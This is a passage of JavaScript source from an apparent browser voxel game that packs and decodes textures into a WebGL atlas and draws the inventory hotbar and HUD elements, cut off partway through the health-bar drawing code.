    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
    gl.useProgram(programText)
		gl.uniform1i(glCache.uSamplerText, 9)
  }
	//packer from https://codeincomplete.com/articles/bin-packing/ and modified
	class BinaryTreeBinPacker{
		constructor(w, h) {
			this.root = { x: 0, y: 0, w, h, maxw:w, maxh:h }
			//maxw and maxh is the maximum width and height of all nodes at the end
			//maxw and maxh is an optimization by preventing checking places that don't have enough space at the end
			this.searchArray = []
			win.sassa=this
		}
		async fit(blocks) {
			//blocks is array of objects like: {w, h} and becomes: {w, h, x, y}
			blocks = blocks.slice()
			blocks.sort((a,b) => {
				return(
					(max(b.w,b.h)-max(a.w,a.h)) ||
					(min(b.w,b.h)-min(a.w,a.h)) ||
					(b.h-a.h) ||
					(b.w-a.w)
				)
			})
			let node, block
			for (let n = 0; n < blocks.length; n++) {
				block = blocks[n]
				node = this.findNode(block.w, block.h)
				if (node){
					node = this.splitNode(node, block.w, block.h)
					block.x = node.x, block.y = node.y
				}else throw new Error("Cannot fit rectangle")
				await yieldThread()
			}
		}
		findNode(w, h) {
			let {searchArray, root} = this
			searchArray.length = 0
			searchArray[0] = root
			searchArray[1] = 0
			let i = 0, block, checked
			while(i > -1){
				block = searchArray[i]
				checked = searchArray[i+1]
				if(checked === 2 || w > block.maxw || h > block.maxh){
					i -= 2
					if(i>-1) searchArray[i+1]++//make it check a different one
				}else if(block.used){
					i += 2
					if(checked) searchArray[i] = block.down
					else searchArray[i] = block.right
					searchArray[i+1] = 0
				}else return block
			}
			return null//if failed
		}
		splitNode(node, w, h) {
			node.used = true
			node.down  = { x: node.x,     y: node.y + h, w: node.w,     h: node.h - h, parent:node }
			node.right = { x: node.x + w, y: node.y,     w: node.w - w, h: h,          parent:node }
			node.down.maxw = node.down.w, node.down.maxh = node.down.h
			node.right.maxw = node.right.w, node.right.maxh = node.right.h
			//update max width and max height of all parent nodes
			let parent = node, maxw, maxh, downExist, rightExist
			while(parent){
				downExist = parent.down.w&&parent.down.h ? 1 : 0
				rightExist = parent.right.w&&parent.right.h? 1 : 0
				maxw = max(downExist*parent.down.maxw, rightExist*parent.right.maxw)
				maxh = max(downExist*parent.down.maxh, rightExist*parent.right.maxh)
				if(maxw === parent.maxw && maxh === parent.maxh) break
				parent.maxw = maxw, parent.maxh = maxh
				parent = parent.parent
			}
			return node
		}
	}
  let texturePixels
  let textureImageData //for drawing on canvas
  let textureImageCanvas
  let textureImageCtx
  let textureSize = 256
  let textureH = 4096
	let initTextureProgress = 0
	let setPixOffsetX
	let lastResourcesHash
	function setThemTextures(_textureMap,_textureCoords){
		textureMap = _textureMap
		textureCoords = _textureCoords
	}
	async function initTextures() {
		initTextureProgress = 0
		let scale = 1 / textureSize
    let scaleH = 1 / textureH
		texturePixels = new Uint8Array(textureSize * textureH * 4)
    textureImageData = ctx.createImageData(textureSize, textureH)
    win.textureImageData = textureImageData
    textureImageCanvas = new OffscreenCanvas(textureSize,textureH)
    win.textureImageCanvas = textureImageCanvas
    textureImageCtx = textureImageCanvas.getContext("2d")
		let textureMap = {}
		let textureCoords = []
		lastResourcesHash = resourcesHash

		setPixel = function(textureNum, x, y, r, g, b, a) {
			let data = textureRects[textureNum]
			let texX = data.x+setPixOffsetX//textureNum & 15
			let texY = data.y//textureNum >> 4
			let offset = ((texY+y)*textureSize + texX+x)*4//(texY * 16 + y) * 1024 + texX * 64 + x * 4
			texturePixels[offset] = r
			texturePixels[offset + 1] = g
			texturePixels[offset + 2] = b
			texturePixels[offset + 3] = a !== undefined ? a : 255
		}
		/*getPixels = function(str) {
			// var w = parseInt(str.substr(0, 2), 36)
			// var h = parseInt(str.substr(2, 2), 36)
			var colors = []
			var pixels = []
			var dCount = 0
			for (;str[4 + dCount] === "0"; dCount++) {}
			var ccount = parseInt(str.substr(4+dCount, dCount+1), 36)
			for (var i = 0; i < ccount; i++) {
				var num = parseInt(str.substr(5 + 2*dCount + i * 7, 7), 36)
				colors.push([ num >>> 24 & 255, num >>> 16 & 255, num >>> 8 & 255, num & 255 ])
			}
			for (let i = 5 + 2*dCount + ccount * 7; i < str.length; i++) {
				let num = parseInt(str[i], 36)
				pixels.push(colors[num][0], colors[num][1], colors[num][2], colors[num][3])
			}
			return pixels
		};*/
    const base256CharSet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEF!#$%&L(MNO)*+,-./:;<=WSTR>Q?@[]P^_{|}~UVKGHXIJYZ'
    const base256DecodeMap = new Map()
    for (let i = 0; i < 256; i++) base256DecodeMap.set(base256CharSet[i], i)
    function decodeByte(str) {
      let num = 0
      for (let char of str) {
        num <<= 8
        num += base256DecodeMap.get(char)
      }
			if(isNaN(num))debugger
      return num
    }
    getPixels = function(str, r = 255, g = 255, b = 255, includeSize = false) {
      const width = decodeByte(str.substr(0, 2))
      const height = decodeByte(str.substr(2, 2))
      const colorCount = decodeByte(str.substr(4, 1))
      const colors = []
      const pixels = new Uint8ClampedArray(width * height * 4)
      let pixi = 0

      for (let i = 0; i < colorCount; i++) {
        const num = decodeByte(str.substr(5 + i * 3, 3))

        let alpha = (num & 63) << 2
        let blue  = (num >>> 6 & 63) << 2
        let green = (num >>> 12 & 63) << 2
        let red   = (num >>> 18 & 63) << 2
        if (alpha >= 240) alpha = 255 // Make sure we didn't accidentally make the texture transparent

        if (red === blue && red === green) {
          red = red / 252 * r | 0
          green = green / 252 * g | 0
          blue = blue / 252 * b | 0
        }
        colors.push([ red, green, blue, alpha ])
      }

      // Special case for a texture filled with 1 pixel color
      if (colorCount === 1) {
        while (pixi < pixels.length) {
          pixels[pixi + 0] = colors[0][0]
          pixels[pixi + 1] = colors[0][1]
          pixels[pixi + 2] = colors[0][2]
          pixels[pixi + 3] = colors[0][3]
          pixi += 4
        }
				if(includeSize) return [pixels,width,height]
				else return pixels
      }

      let bytes = []
      for (let i = 5 + colorCount * 3; i < str.length; i++) { // Load the bit-packed index array
        const byte = decodeByte(str[i])
        bytes.push(byte)
      }

      const bits = Math.ceil(Math.log2(colorCount))
      const bitMask = (1 << bits) - 1
      let filledBits = 8
      let byte = bytes.shift()
      while (bytes.length || filledBits) {
        let num = 0
        if (filledBits >= bits) { // The entire number is inside the byte
          num = byte >> (filledBits - bits) & bitMask
          if (filledBits === bits && bytes.length) {
            byte = bytes.shift()
            filledBits = 8
          }
          else filledBits -= bits
        }
        else {
          num = byte << (bits - filledBits) & bitMask // Only part of the number is in the byte
          byte = bytes.shift() // Load in the next byte
          num |= byte >> (8 - bits + filledBits) // Apply the rest of the number from this byte
          filledBits += 8 - bits
        }

        pixels[pixi + 0] = colors[num][0]
        pixels[pixi + 1] = colors[num][1]
        pixels[pixi + 2] = colors[num][2]
        pixels[pixi + 3] = colors[num][3]
        pixi += 4
      }
      if(includeSize) return [pixels,width,height]
			else return pixels
    }
		
		let texturePacker = new BinaryTreeBinPacker(textureSize,textureH)
		let textureRects = []
		function addTexRect(i){
			let pix,w,h,allw
			let tex = customResources.textures[i] || textures[i]
			if(typeof tex === "string"){
				([pix,w,h] = getPixels(tex, undefined,undefined,undefined, true))
			}else if(Array.isArray(tex)){
				pix = [], allw = []//connected textures
				h = null, w = 0
				for(let t of tex){
					if(typeof t === "string"){
						let data = getPixels(t, undefined,undefined,undefined, true)
						if(h === null) h = data[2]
						else if(data[2] !== h) throw new Error("Connected textures must have same height because they are connected horizontally")
						w += data[1]
						pix.push(data[0])
						allw.push(data[1])
					}else{
						if(h === null) h = 16
						w += 16//function
						pix.push(null), allw.push(16)
					}
				}
			}else{
				w = h = 16//function
			}
			textureRects.push({w,h,pix,allw})
		}
		for (let i in textures){
			addTexRect(i)
		}
		for (let i in customResources.textures){
			if(!textures[i]) addTexRect(i)
		}
		await texturePacker.fit(textureRects)
    
    semiTransTextures.length = 0
    
    textureUpdated()

		{
      //get amount of textures
      //var t = 0
      //for(var i in textures) t++
      ////t = Math.ceil(t / 16) * 16
      
			// Specify the texture coords for each index
			/*for (let i = 0; i < t; i++) {
				let texX = i & 15
				let texY = i >> 4
				let offsetX = texX * s
				let offsetY = texY * sh
				textureCoords.push(new Float32Array([ offsetX, offsetY, offsetX + s, offsetY, offsetX + s, offsetY + sh, offsetX, offsetY + sh ]))
			}*/

			// Set all of the textures into 1 big tiled texture
			function doTexture(i){
				let tex = customResources.textures[i] || textures[i]
				let data = textureRects[n]
				let semiTrans = false
				setPixOffsetX = 0
				try{
					if (typeof tex === "function") {
						tex(n)
					} else if (typeof tex === "string") {
						let {pix,w,h} = data
						for (let j = 0; j < pix.length; j += 4) {
							setPixel(n, (j*0.25)%w, floor(j*0.25/w), pix[j], pix[j+1], pix[j+2], pix[j+3])
							let a = pix[j+3]
							if(a !== 0 && a !== 255){
								semiTrans = true
							}
						}
					} else if(Array.isArray(tex)){
						let {allw,pix:allpix,h} = data//connect array of textures
						let offsetX = 0, w, pix
						for(let t=0; t<allpix.length; t++){
							w = allw[t], pix = allpix[t]
							setPixOffsetX = offsetX
							if(pix){
								for (let j = 0; j < pix.length; j += 4) {
									setPixel(n, ((j*0.25)%w), floor(j*0.25/w), pix[j], pix[j+1], pix[j+2], pix[j+3])
									let a = pix[j+3]
									if(a !== 0 && a !== 255){
										semiTrans = true
									}
								}
							}else tex[t](n)
							offsetX += w
						}
					}
				}catch(e){
					logError(e)
					logError("Texture broken: "+i)
					console.error(e)
					textures.error(n)
				}
				if(semiTrans)semiTransTextures.push(i)
				textureMap[i] = n
				let offsetX = data.x * scale
				let offsetY = data.y * scaleH
				let w = (data.allw ? data.allw[0] : data.w) * scale, h = data.h * scaleH
				textureCoords.push(new Float32Array([ offsetX, offsetY, offsetX + w, offsetY, offsetX + w, offsetY + h, offsetX, offsetY + h ]))
				n++
			}
			let n = 0
			for (let i in textures){
				doTexture(i)
				if(!(n%80)) await yieldThread()
			}
			for (let i in customResources.textures){
				if(!textures[i]) doTexture(i)
				if(!(n%80)) await yieldThread()
			}
      
      for(var t in animated){
        var a = animated[t].arr
        var trans
        for(var ti = 0; ti<a.length; ti++){
          if(semiTransTextures.includes(a[ti])){//if this animated texture has transparent frames
            trans = true
          }
        }
        if(trans) semiTransTextures.push(t)
      }

			//Set the hitbox texture to 1 pixel
			let arr = new Float32Array(400)
			for (let i = 0; i < 400; i += 2) {
				arr[i] = textureCoords[textureMap.hitbox][0] + scale//Add 1px right and down
				arr[i + 1] = textureCoords[textureMap.hitbox][1] + scaleH
			}
			textureCoords[textureMap.hitbox] = arr
		}

		setThemTextures(textureMap,textureCoords)
		animated = Object.assign({},originalAnimated,customResources.animated) //don't change time of originals
    
    //Set imageData
    textureImageData.data.set(texturePixels)
    textureImageCtx.putImageData(textureImageData,0,0)

		// Big texture with everything in it
		textureAtlas = gl.createTexture()
		gl.activeTexture(gl.TEXTURE0)
		gl.bindTexture(gl.TEXTURE_2D, textureAtlas)
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, textureSize, textureH, 0, gl.RGBA, gl.UNSIGNED_BYTE, texturePixels)
		gl.generateMipmap(gl.TEXTURE_2D)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		gl.useProgram(program3D)
		gl.uniform1i(glCache.uSampler, 0)

		// Dirt texture for the background
		let dirtPixels = new Uint8Array(getPixels(customResources.textures.dirt || textures.dirt))
		dirtTexture = gl.createTexture()
		gl.activeTexture(gl.TEXTURE1)
		gl.bindTexture(gl.TEXTURE_2D, dirtTexture)
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16, 16, 0, gl.RGBA, gl.UNSIGNED_BYTE, dirtPixels)
		gl.generateMipmap(gl.TEXTURE_2D)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT)
    
    // Netherrack texture for the background
		let netherPixels = new Uint8Array(getPixels(customResources.textures.netherrack || textures.netherrack))
		netherTexture = gl.createTexture()
		gl.activeTexture(gl.TEXTURE2)
		gl.bindTexture(gl.TEXTURE_2D, netherTexture)
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16, 16, 0, gl.RGBA, gl.UNSIGNED_BYTE, netherPixels)
		gl.generateMipmap(gl.TEXTURE_2D)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT)
    
    let weatherPixels = new Uint8Array([140,120,100,255])
    weatherTexture = gl.createTexture()
    gl.activeTexture(gl.TEXTURE3)
		gl.bindTexture(gl.TEXTURE_2D, weatherTexture)
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, weatherPixels)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT)
		if(images.weather.naturalWidth){
			gl.activeTexture(gl.TEXTURE3)
			gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.weather)
		}else{
			images.weather.addEventListener("load", function(){
				gl.activeTexture(gl.TEXTURE3)
				gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.weather)
			})
		}
    
    // Endstone texture for the background
		let endPixels = new Uint8Array(getPixels(customResources.textures.endStone || textures.endStone))
		endTexture = gl.createTexture()
		gl.activeTexture(gl.TEXTURE5)
		gl.bindTexture(gl.TEXTURE_2D, endTexture)
		gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16, 16, 0, gl.RGBA, gl.UNSIGNED_BYTE, endPixels)
		gl.generateMipmap(gl.TEXTURE_2D)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT)
    
    let panoramaPixels = new Uint8Array([140,120,100,255])
    panoramaTexture = gl.createTexture()
    gl.activeTexture(gl.TEXTURE4)
		gl.bindTexture(gl.TEXTURE_2D, panoramaTexture)
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, panoramaPixels)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		if(images.panorama.naturalWidth){
			gl.activeTexture(gl.TEXTURE4)
			gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.panorama)
		}else{
			images.panorama.addEventListener("load", function(){
				gl.activeTexture(gl.TEXTURE4)
				gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.panorama)
			})
		}
    
		//texture 6 for avgBrightnessResultTexture
    
		//texture 7 for skin
    defaultSkinTexture = gl.createTexture()
    gl.activeTexture(gl.TEXTURE7)
		gl.bindTexture(gl.TEXTURE_2D, defaultSkinTexture)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		if(images.skin.naturalWidth){
    	gl.activeTexture(gl.TEXTURE7)
      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.skin)
		}else{
			images.skin.addEventListener("load", function(){
    		gl.activeTexture(gl.TEXTURE7)
				gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.skin)
			})
		}
    
    let endPortalPixels = new Uint8Array([140,120,100,255])
    endPortalTexture = gl.createTexture()
    gl.activeTexture(gl.TEXTURE8)
		gl.bindTexture(gl.TEXTURE_2D, endPortalTexture)
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, endPortalPixels)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT)
		if(images.endPortal.naturalWidth){
			gl.activeTexture(gl.TEXTURE8)
      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.endPortal)
		}else{
			images.endPortal.addEventListener("load", function(){
				gl.activeTexture(gl.TEXTURE8)
				gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, images.endPortal)
			})
		}
    
    //TEXTURE9 is text texture
		lastAnimations = null
		initTextureProgress = 1

		avgBrightnessCanvasTexture = gl.createTexture()
		gl.activeTexture(gl.TEXTURE10)
		gl.bindTexture(gl.TEXTURE_2D, avgBrightnessCanvasTexture)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
		
		//texture 11,12,13 for shadow maps
	}
  
	let lastAnimations = null
	function updateTextures() {return//todo n
		if(!lastAnimations){
			lastAnimations = {}
		}else if(performFast) return
		for(let i in animated){
			let t = animated[i]
			let fi = performFast || !t.time ? 0 : Math.floor((now / t.time) % t.arr.length)
			if(fi === lastAnimations[i] && !t.interpolate && t.time) continue
			lastAnimations[i] = fi
			let fi2 = (fi+1) % t.arr.length
			let lerpAmount = (now / t.time) % 1
			let frame = t.arr[fi]
			let frame2 = t.arr[fi2]
			let idx = textureMap[i]
			/*let r=1,g=1,b=1,a=1
			if(t.tint){
				r = t.tint[0]/255
				g = t.tint[1]/255
				b = t.tint[2]/255
				a = t.tint[3]/255
				if(isNaN(a)) a = 1
			}*/
			let connected = t.connected
			let connectAmount = connected ? frame.length : 1
			setPixOffsetX = 0
			for(let c=0; c<connectAmount; c++){
				let pos = textureCoords[textureMap[connected ? frame[c] : frame]]
				let pos2 = textureCoords[textureMap[connected ? frame2[c] : frame2]]
				let texX = pos[0]*textureSize, texY = pos[1]*textureH
				let texW = pos[2]*textureSize-texX, texH = pos[5]*textureH-texY
				let texX2 = pos2[0]*textureSize, texY2 = pos2[1]*textureH
				for(let x=0; x<texW; x++){
					for(let y=0; y<texH; y++){
						let offset = ((texY+y)*textureSize + texX+x)*4
						let offset2 = ((texY2+y)*textureSize + texX2+x)*4
						let pixr = texturePixels[offset]
						let pixg = texturePixels[offset+1]
						let pixb = texturePixels[offset+2]
						let pixa = texturePixels[offset+3]
						if(t.interpolate){
							pixr = lerp(lerpAmount, pixr, texturePixels[offset2])
							pixg = lerp(lerpAmount, pixg, texturePixels[offset2+1])
							pixb = lerp(lerpAmount, pixb, texturePixels[offset2+2])
							pixa = lerp(lerpAmount, pixa, texturePixels[offset2+3])
						}
						setPixel(idx, x,y, pixr,pixg,pixb,pixa)
					}
				}
				setPixOffsetX += texW
			}
		}
		
		if(portalEffect > 0 || p.burning){
			textureImageData.data.set(texturePixels)
			textureImageCtx.putImageData(textureImageData,0,0)
		}
		gl.activeTexture(gl.TEXTURE0)
		gl.bindTexture(gl.TEXTURE_2D, textureAtlas)
		gl.texSubImage2D(gl.TEXTURE_2D, 0, 0,0, textureSize, textureH, gl.RGBA, gl.UNSIGNED_BYTE, texturePixels);
	}

	function drawIcon(x, y, id, obj, noAmount, addScale) {
		id = id < isCube && !blockData[id].item ? (id | blockMode) : id
		if(!blockData[id]) throw new Error("no block modified-id:"+id+" blockMode:"+blockMode)
		let X = x / (3 * height) - 0.1666 * width / height
		let Y = y / (3 * height) - 0.1666
    let scale = 0.16 / height * inventory.size
    if(obj && obj.animation) scale *= obj.animation
		if(addScale) scale *= addScale
		if(changeSceneAnimation !== null && obj !== false){
			scale *= thisSceneCurrent ? animationAmount : 1-animationAmount
		}
		let data = blockData[id]
    
		initModelView(null, X, Y, 0, 0, 0, scale)

		let buffer = blockIcons[id]
    let length = blockIcons.lengths[id]
    if(!blockIcons[id]){
      buffer = blockIconError
      length = blockIconError.length
    }
		gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
		gl.vertexAttribPointer(glCache.aVertex, 3, gl.FLOAT, false, 24, 0)
		gl.vertexAttribPointer(glCache.aTexture, 2, gl.FLOAT, false, 24, 12)
		gl.vertexAttribPointer(glCache.aShadow, 1, gl.FLOAT, false, 24, 20)
		gl.disableVertexAttribArray(glCache.aSkylight)
		gl.disableVertexAttribArray(glCache.aBlocklight)
    gl.disableVertexAttribArray(glCache.tint)
		gl.vertexAttrib1f(glCache.aSkylight, 1.0)
		gl.vertexAttrib1f(glCache.aBlocklight, 1.0)
    var r = 1, g = 1, b = 1
    if(blockData[id].invTint){
      var t = blockData[id].invTint
      r = t[0], g = t[1], b = t[2]
    }
    gl.vertexAttrib3f(glCache.tint, r,g,b)
		gl.drawElements(gl.TRIANGLES, length, gl.UNSIGNED_INT, 0)
    if(data.semiTrans){
			gl.depthMask(false)
      gl.uniform1i(glCache.uTrans, 1)
      gl.drawElements(gl.TRIANGLES, length, gl.UNSIGNED_INT, 0)
      gl.uniform1i(glCache.uTrans, 0)
			gl.depthMask(true)
    }
    
    if(!obj) return
    
    let s = inventory.size
    let s2 = s/2
    let ts = inventory.ts
    if(obj.durability){
      let percent = obj.durability / blockData[id].durability
      if(percent !== 1){
        let ww = (s-(ts*2))
        let w = ww*percent
        let color = percent > 0.6666 ? "#af5" : (percent > 0.3333 ? "#fa0" : "#f55")
        let dx = x-s2+ts
        let dy = y+s2-(ts*3)
        let prevFill = ctx2.fillStyle
        ctx2.fillStyle = "#333"
        ctx2.fillRect(dx,dy,ww,ts*2)
        ctx2.fillStyle = color
        ctx2.fillRect(dx,dy,w,ts)
        ctx2.fillStyle = prevFill
      }
    }
    if(obj.amount !== 1 && !noAmount){
      ctx2.fillStyle = "white"
      ctx2.font = (s/3)+"px thefont"
      ctx2.textAlign = "right"
      ctx2.fillText(obj.amount, x+(s/2), y+(s/2))
    }
	}

	function hotbar() {
		FOV(90)
    let s = inventory.size
    let s2 = s/2

		for(let i = 0; i < 9; i ++) {
      let x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
		  let y = height - inventory.size
			let item = inventory.slots[inventory.slotIds.hotbar[i]]
			if(item) {
				if(!blockData[item.id])throw new Error("no block "+item.id+" from hotbar()")
				drawIcon(x, y, item.id, item, !p.survival)
			}
		}
    if(touchScreen && screen === "play"){
      let i = 9
      let x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
      let y = height - inventory.size
      ctx.fillStyle = "#0a0"
      ctx.fillRect(x-s2, y-s2, s,s)
      ctx.textAlign = "center"
      var prev = ctx.textBaseline
      ctx.textBaseline = "middle";
      textSize(s*0.8)
      ctx.fillStyle = "white"
      ctx.fillText("...",x,y)
      i = -1
      x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
      ctx.fillStyle = "#0a0"
      ctx.fillRect(x-s2, y-s2, s,s)
      ctx.fillStyle = "white"
      ctx.fillText("",x,y)
      ctx.textAlign = 'left'
      ctx.textBaseline = prev;
    }
	}
	function drawTexture(name,x,y,w,h){
		let tex = textureCoords[textureMap[name]]
		ctx.drawImage(textureImageCanvas, round(tex[0]*textureSize),round(tex[1]*textureH), round((tex[2]-tex[0])*textureSize),round((tex[5]-tex[1])*textureH), x,y,w,h)
	}
	let debugLines = [], showDebug = -1
	function hud() {
		gl.clearColor(0, 0, 0, 0)
		gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
		const ss = inventory.ss
		if (!p.spectator) {
    gl.useProgram(program3D)
    gl.uniform1i(glCache.uSampler, 0)
    ctx.textAlign = 'left'

		hotbar()

		let s = inventory.size
    let s2 = s / 2
		let x = width / 2 + 0.5
		let y = height / 2 + 0.5
    let maxX = inventory.maxX
    
    textSize(10)
    
    // Spyglass image
    if(p.usingItem && holding === blockIds.spyglass){
      let w2 = width / 2
      let h2 = height / 2
			p.spyglassTimer = Date.now() - p.spyglassStart
      let t = p.spyglassTimer > 250 ? 250 : p.spyglassTimer
      let size = min(width, height)
      size = map(t,0,250, size/2,size)
      let size2 = size / 2
      ctx.fillStyle = "black"
      ctx.fillRect(0,0,width,height)
      ctx.clearRect(w2 - size2, h2 - size2, size, size)
      drawImage("spyglassScope", w2 - size2, h2 - size2, size, size)
    }

		// Crosshair
		if (performFast) {
			ctx.lineWidth = 1
			ctx.strokeStyle = "white"
			ctx.beginPath()
			ctx.moveTo(x - 10, y)
			ctx.lineTo(x + 10, y)
			ctx.moveTo(x, y - 10)
			ctx.lineTo(x, y + 10)
			ctx.stroke()
		}
    
    //fire and portal
    if(p.burning && !p.thirdPerson){
      ctx.globalAlpha = 0.8
			drawTexture("fire",0,0,width,height)
      ctx.globalAlpha = 1
    }
    if(portalEffect > 0){
      ctx.globalAlpha = portalEffect / 100
			drawTexture("portal",0,0,width,height)
      ctx.globalAlpha = 1
    }
    
    //Attack indicator
    if(attackCooldown > 0){
      var c = attackCooldown * 16
      drawImage("attackIndicatorCrosshair", 0,0,16,4, x-16,y+10,32,8)
      drawImage("attackIndicatorCrosshair", 16,0,c,4, x-16,y+10,c*2,8)
    }
    
		if(p.survival){
			if(p.temperature > 19){
				fill(255,0,0, (p.temperature-19)/8 * (sin(now/1000*Math.PId)*0.5+0.5)*100)
				ctx.fillRect(0,0,width,height)
				//drawImage("veryHot",0,0,width,height)
			}
			if(p.temperature < 1){
				fill(0,0,127, (1-p.temperature)/8 * (sin(now/1000*Math.PId)*0.5+0.5)*100)
				ctx.fillRect(0,0,width,height)
				//drawImage("veryCold",0,0,width,height)
			}
		}

		//Hotbar
		x = width / 2 - 9 / 2 * s + 0.5 + 25
		y = height - s * 1.5 + 0.5

		ctx.fillStyle = "#0004"
		ctx.fillRect(x,y,s*9,s)
		ctx.strokeStyle = "black"
		ctx.lineWidth = 2
		ctx.beginPath()
		ctx.moveTo(x, y)
		ctx.lineTo(x + s * 9, y)
		ctx.moveTo(x, y + s)
		ctx.lineTo(x + s * 9, y + s)
		for(let i = 0; i <= 9; i++) {
			ctx.moveTo(x + i * s, y)
			ctx.lineTo(x + i * s, y + s)
		}
		ctx.stroke()

		ctx.strokeStyle = "white"
		ctx.lineWidth = 2
		ctx.beginPath()

		ctx.strokeRect(width / 2 - 9 / 2 * s + inventory.hotbarSlot * s + 25, height - s * 1.5, s, s)
		/*else{
			let padw = s*9/182, padh = s/22
			drawImage("hotbar",0,0,182,22, x-padw,y-padh,s*9+padw*2,s+padh*2)
			drawImage("hotbar",0,22,24,25, x+inventory.hotbarSlot*s-padw*2/*-((inventory.hotbarSlot-4.5)/4.5)*padw*2*-/,y-padh*2,s+padw*4,s+padh*5)
		}*/

    if(p.survival){
			let {iw,xpbh,iw2,dw,aw,iy,ih,pw} = inventory
      //Health bar
      let outline = healEffect < 40 && healEffect > 30 || healEffect < 20 && healEffect > 10 || 
				loseHealthEffect < 60 && loseHealthEffect > 50 || loseHealthEffect < 40 && loseHealthEffect > 30 || loseHealthEffect < 20 && loseHealthEffect > 10
